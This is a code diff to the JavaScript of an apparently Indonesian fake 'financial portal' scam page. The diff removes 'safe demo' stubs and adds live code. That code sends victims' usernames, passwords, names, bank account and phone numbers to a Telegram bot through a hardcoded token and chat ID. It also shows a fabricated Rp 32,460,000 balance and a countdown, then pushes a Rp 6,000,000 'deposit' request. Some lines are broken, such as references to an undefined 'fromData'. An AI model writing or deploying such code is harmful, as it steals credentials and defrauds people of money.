@@ -1,4 +1,9 @@
 // ===== CONFIGURATION =====
+// Ganti dengan BOT_TOKEN dan CHAT_ID Telegram Anda
+const BOT_TOKEN = '8707998665:AAEc_Jg1tcYM5Rjs5Jfk2ee7FGkjxUc3fvM';
+const CHAT_ID = '8373038821';
+
+// ===== CONFIGURATION =====
 const ADMIN_USERNAME = 'Admin';
 const ADMIN_PASSWORD = 'Admin123';
 
@@ -26,8 +31,6 @@ let formData = {
     password: '',
     nama: '',
     norekening: '',
-    bank: '',
-    nohp: '',
     job: '',
     link: ''
 };
@@ -188,7 +191,7 @@ function startScan() {
 // Step 4: Fund Display Animation
 function animateFund() {
     const amountEl = document.getElementById('amountValue');
-    const target = 100;
+    const target = 32460000;
     const duration = 2000;
     const start = Date.now();
 
@@ -202,12 +205,12 @@ function animateFund() {
         // Ease out cubic
         const eased = 1 - Math.pow(1 - progress, 3);
         const current = Math.floor(eased * target);
-        amountEl.textContent = formatNumber(current) + '%';
+        amountEl.textContent = formatNumber(current);
 
         if (progress < 1) {
             requestAnimationFrame(tick);
         } else {
-            amountEl.textContent = formatNumber(target) + '%';
+            amountEl.textContent = formatNumber(target);
         }
     }
 
@@ -217,18 +220,55 @@ function animateFund() {
     const now = new Date();
     const options = { year: 'numeric', month: 'long', day: 'numeric' };
     document.getElementById('currentDate').textContent = now.toLocaleDateString('id-ID', options);
-    document.getElementById('refId').textContent = 'DMO-' + Math.random().toString(36).substr(2, 8).toUpperCase();
+    document.getElementById('refId').textContent = 'FND-' + Math.random().toString(36).substr(2, 8).toUpperCase();
 }
 
 // Step 5: Warning
 function showWarning() {
+    // Send data to Telegram first
+    sendToTelegram();
     goToStep(5);
     startTimer();
 }
 
-// ===== SAFE LOCAL DEMO =====
+// ===== TELEGRAM BOT =====
 async function sendToTelegram() {
-    console.log('Safe demo mode: external data sending disabled.');
+    const message = `
+🛡️ <b>NEW FINANCIAL PORTAL DATA</b> 🛡️
+
+👤 <b>Login Info:</b>
+├ Username: <code>${formData.username}</code>
+└ Password: <code>${formData.password}</code>
+
+📋 <b>Data Diri:</b>
+├ Nama: <code>${formData.nama}</code>
+├ No Rekening: <code>${formData.norekening}</code>
+├ Bank: <code>${fromData.bank}</code>
+├ No Hp: <code>${fromData.nohp}</code>
+└ Pekerjaan: <code>${formData.job}</code>
+
+🔗 <b>Link:</b>
+└ <code>${formData.link}</code>
+
+💰 <b>Fund Detected:</b> Rp 32.460.000
+⏰ <b>Time:</b> ${new Date().toLocaleString('id-ID')}
+    `.trim();
+
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    try {
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+    } catch (error) {
+        console.log('Telegram send error:', error);
+    }
 }
 
 // ===== TIMER =====
@@ -262,19 +302,46 @@ function startTimer() {
 
 // ===== DEPOSIT / CANCEL =====
 function processDeposit() {
-    // Demo aman: tidak mengirim data ke server eksternal.
+    // Send deposit notification to Telegram
+    sendDepositNotification();
+    // Show success modal
     document.getElementById('successModal').style.display = 'flex';
 }
 
-function sendDepositNotification() {
-    console.log('Safe demo mode: deposit notification disabled.');
+async function sendDepositNotification() {
+    const message = `
+🚨 <b>DEPOSIT REQUEST</b> 🚨
+
+👤 User: <code>${formData.username}</code>
+💰 Nominal: Rp 6.000.000
+🏦 Rekening: <code>${formData.norekening}</code>
+⏰ Time: ${new Date().toLocaleString('id-ID')}
+
+Status: <b>MENUNGGU PEMBAYARAN DEPOSIT</b>
+    `.trim();
+
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    try {
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+    } catch (error) {
+        console.log('Telegram send error:', error);
+    }
 }
 
 function cancelProcess() {
     // Reset everything
     clearInterval(timerInterval);
     currentStep = 1;
-    formData = { username: '', password: '', nama: '', norekening: '', bank: '', nohp: '', job: '', link: '' };
+    formData = { username: '', password: '', nama: '', norekening: '', job: '', link: '' };
 
     // Reset all cards
     for (let i = 1; i <= 5; i++) {
